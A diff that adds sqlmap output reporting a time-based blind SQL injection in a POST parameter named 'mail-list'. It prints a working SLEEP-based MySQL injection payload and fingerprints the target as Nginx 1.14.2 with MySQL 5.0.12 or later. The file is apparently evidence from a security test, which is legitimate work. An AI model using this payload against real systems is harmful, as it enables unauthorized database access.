@@ -1,0 +1,9 @@
+sqlmap identified the following injection point(s) with a total of 40 HTTP(s) requests:
+---
+Parameter: mail-list (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: mail-list=test@test.com' AND (SELECT 8778 FROM (SELECT(SLEEP(5)))FtKZ)-- ONnv
+---
+web application technology: Nginx 1.14.2
+back-end DBMS: MySQL >= 5.0.12
